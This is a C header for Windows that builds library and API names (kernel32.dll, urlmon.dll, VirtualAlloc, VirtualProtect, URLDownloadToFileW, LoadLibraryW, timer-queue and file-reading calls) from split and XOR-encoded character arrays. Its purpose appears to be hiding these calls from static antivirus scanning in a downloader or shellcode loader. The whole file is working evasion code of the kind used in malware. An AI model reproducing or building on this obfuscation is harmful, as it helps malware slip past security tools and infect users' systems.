#ifndef STRINGS_H
#define STRINGS_H

#include <windows.h>
#include "custom_crt.h"

void BuildString(char* dest, const char* parts[], int count) {
    dest[0] = '\0';
    for (int i = 0; i < count; i++) {
        my_strcat(dest, parts[i]);
    }
}

void BuildWString(wchar_t* dest, const wchar_t* parts[], int count) {
    dest[0] = L'\0';
    for (int i = 0; i < count; i++) {
        my_wcscat(dest, parts[i]);
    }
}

void BuildKernel32(wchar_t* dest) {
    wchar_t p0[] = {'k','e','r',0};
    wchar_t p1[] = {'n','e','l',0};
    wchar_t p2[] = {'3','2',0};
    wchar_t p3[] = {'.',0};
    wchar_t p4[] = {'d','l','l',0};
    const wchar_t* parts[] = {p0, p1, p2, p3, p4};
    BuildWString(dest, parts, 5);
}

void BuildUrlmon(wchar_t* dest) {
    wchar_t p0[] = {'u','r','l',0};
    wchar_t p1[] = {'m','o','n',0};
    wchar_t p2[] = {'.',0};
    wchar_t p3[] = {'d','l','l',0};
    const wchar_t* parts[] = {p0, p1, p2, p3};
    BuildWString(dest, parts, 4);
}

void BuildVirtualAlloc(char* dest) {
    char p0[] = {'V','i','r',0};
    char p1[] = {'t','u','a','l',0};
    char p2[] = {'A','l','l',0};
    char p3[] = {'o','c',0};
    const char* parts[] = {p0, p1, p2, p3};
    BuildString(dest, parts, 4);
}

void BuildVirtualProtect(char* dest) {
    char p0[] = {'V','i','r',0};
    char p1[] = {'t','u','a','l',0};
    char p2[] = {'P','r','o',0};
    char p3[] = {'t','e','c','t',0};
    const char* parts[] = {p0, p1, p2, p3};
    BuildString(dest, parts, 4);
}

void BuildCreateFileW(char* dest) {
    char p0[] = {'C','r','e',0};
    char p1[] = {'a','t','e',0};
    char p2[] = {'F','i','l','e',0};
    char p3[] = {'W',0};
    const char* parts[] = {p0, p1, p2, p3};
    BuildString(dest, parts, 4);
}

void BuildReadFile(char* dest) {
    char p0[] = {'R','e','a',0};
    char p1[] = {'d',0};
    char p2[] = {'F','i','l','e',0};
    const char* parts[] = {p0, p1, p2};
    BuildString(dest, parts, 3);
}

void BuildCloseHandle(char* dest) {
    char p0[] = {'C','l','o',0};
    char p1[] = {'s','e',0};
    char p2[] = {'H','a','n',0};
    char p3[] = {'d','l','e',0};
    const char* parts[] = {p0, p1, p2, p3};
    BuildString(dest, parts, 4);
}

void BuildGetFileSize(char* dest) {
    char p0[] = {'G'^0x12,'e'^0x12,'t'^0x12,0};
    char p1[] = {'F'^0x12,'i'^0x12,'l'^0x12,'e'^0x12,0};
    char p2[] = {'S'^0x12,'i'^0x12,'z'^0x12,'e'^0x12,0};
    for(int i=0; p0[i]; i++) p0[i]^=0x12;
    for(int i=0; p1[i]; i++) p1[i]^=0x12;
    for(int i=0; p2[i]; i++) p2[i]^=0x12;
    const char* parts[] = {p0, p1, p2};
    BuildString(dest, parts, 3);
}

void BuildURLDownloadToFileW(char* dest) {
    char p0[] = {'U'^0x15,'R'^0x15,'L'^0x15,0};
    char p1[] = {'D'^0x15,'o'^0x15,'w'^0x15,'n'^0x15,0};
    char p2[] = {'l'^0x15,'o'^0x15,'a'^0x15,'d'^0x15,0};
    char p3[] = {'T'^0x15,'o'^0x15,0};
    char p4[] = {'F'^0x15,'i'^0x15,'l'^0x15,'e'^0x15,0};
    char p5[] = {'W'^0x15,0};
    for(int i=0; p0[i]; i++) p0[i]^=0x15;
    for(int i=0; p1[i]; i++) p1[i]^=0x15;
    for(int i=0; p2[i]; i++) p2[i]^=0x15;
    for(int i=0; p3[i]; i++) p3[i]^=0x15;
    for(int i=0; p4[i]; i++) p4[i]^=0x15;
    for(int i=0; p5[i]; i++) p5[i]^=0x15;
    const char* parts[] = {p0, p1, p2, p3, p4, p5};
    BuildString(dest, parts, 6);
}

void BuildCreateTimerQueueTimer(char* dest) {
    char p0[] = {'C','r','e',0};
    char p1[] = {'a','t','e',0};
    char p2[] = {'T','i','m','e','r',0};
    char p3[] = {'Q','u','e','u','e',0};
    char p4[] = {'T','i','m','e','r',0};
    const char* parts[] = {p0, p1, p2, p3, p4};
    BuildString(dest, parts, 5);
}

void BuildDeleteTimerQueueTimer(char* dest) {
    char p0[] = {'D'^0x1A,'e'^0x1A,'l'^0x1A,0};
    char p1[] = {'e'^0x1A,'t'^0x1A,'e'^0x1A,0};
    char p2[] = {'T'^0x1A,'i'^0x1A,'m'^0x1A,'e'^0x1A,'r'^0x1A,0};
    char p3[] = {'Q'^0x1A,'u'^0x1A,'e'^0x1A,'u'^0x1A,'e'^0x1A,0};
    char p4[] = {'T'^0x1A,'i'^0x1A,'m'^0x1A,'e'^0x1A,'r'^0x1A,0};
    for(int i=0; p0[i]; i++) p0[i]^=0x1A;
    for(int i=0; p1[i]; i++) p1[i]^=0x1A;
    for(int i=0; p2[i]; i++) p2[i]^=0x1A;
    for(int i=0; p3[i]; i++) p3[i]^=0x1A;
    for(int i=0; p4[i]; i++) p4[i]^=0x1A;
    const char* parts[] = {p0, p1, p2, p3, p4};
    BuildString(dest, parts, 5);
}

void BuildLoadLibraryW(char* dest) {
    char p0[] = {'L','o','a','d',0};
    char p1[] = {'L','i','b',0};
    char p2[] = {'r','a','r','y',0};
    char p3[] = {'W',0};
    const char* parts[] = {p0, p1, p2, p3};
    BuildString(dest, parts, 4);
}

void BuildSleep(char* dest) {
    char p0[] = {'S','l','e',0};
    char p1[] = {'e','p',0};
    const char* parts[] = {p0, p1};
    BuildString(dest, parts, 2);
}

#endif


